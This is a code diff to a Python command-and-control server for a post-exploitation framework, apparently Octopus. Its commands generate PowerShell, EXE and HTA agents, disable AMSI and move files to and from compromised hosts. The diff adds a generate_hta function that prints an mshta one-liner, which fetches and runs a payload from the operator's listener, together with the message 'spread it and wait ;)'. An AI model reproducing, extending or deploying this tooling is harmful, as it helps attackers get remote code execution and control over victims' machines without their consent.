@@ -7,6 +7,7 @@ from termcolor import colored
 import logging
 import base64
 from encryption import *
+from profile import *
 import time
 import os
 
@@ -18,7 +19,7 @@ listeners_information = {}
 commands = {}
 aes_encryption_key = base64.b64encode("".join([random.choice(string.uppercase) for i in range(32)]))
 
-oct_commands = ["help", "exit", "interact", "list", "listeners", "listen_http", "listen_https", "delete", "generate_powershell", "generate_exe"]
+oct_commands = ["help", "exit", "interact", "list", "listeners", "listen_http", "listen_https", "delete", "generate_powershell", "generate_exe","generate_hta"]
 oct_commands_interact = ["load", "help", "exit", "back", "clear", "upload", "download", "load", "report", "disable_amsi", "modules"]
 
 def check_url(url):
@@ -131,6 +132,11 @@ def generate(hostname, path, proto, interval):
     print "Hack your way in ;)"
     print colored("#====================", "red")
 
+def generate_hta(host_ip, port,proto):
+    print colored("#====================", "red")
+    print "mshta " + '{0}://{1}:{2}{3}'.format(proto,host_ip,port, mshta_url)
+    print "spread it and wait ;)"
+    print colored("#====================", "red")
 
 def generate_exe(hostname, path, proto, output_path):
 	if os.system("which mono-csc") == 0:
@@ -161,6 +167,7 @@ def main_help_banner():
     print "list  \t\t\t\tlist all connected agents"
     print "listeners \t\t\tlist all listeners"
     print "* generate_powershell \t\tgenerate powershell oneliner"
+    print "* generate_hta \t\tgenerate HTA Link"
     print "* generate_exe \t\t\tgenerate executable agent"
     print "* listen_http  \t\t\tto start a HTTP listener"
     print "* listen_https  \t\tto start a HTTPS listener"
